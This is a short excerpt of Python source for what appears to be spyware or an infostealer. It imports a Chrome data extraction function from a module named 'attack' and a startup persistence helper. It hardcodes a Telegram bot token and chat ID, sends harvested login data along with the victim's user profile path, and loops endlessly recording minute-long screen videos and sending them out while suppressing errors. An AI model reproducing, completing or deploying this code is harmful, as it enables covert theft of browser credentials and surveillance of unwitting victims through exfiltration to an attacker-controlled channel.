...
import requests
import os
from attack import extract_chrome_data
from set_startapp import add_to_startup

BOT_TOKEN = '7808767389:AAGNNgOMPLHahwLagIw5CalcPi9OKlA0vis'
CHAT_ID = '6588631008'


def send_login_data(text, pc_owner=os.environ["USERPROFILE"]):
    message = f"{text}\nUser Path: {pc_owner}"
...
def loop_record_send():
    while True:
        ...
        record_screen_video(duration=60, filename=filename)
        try:
            send_video(filename)
        except:
            pass
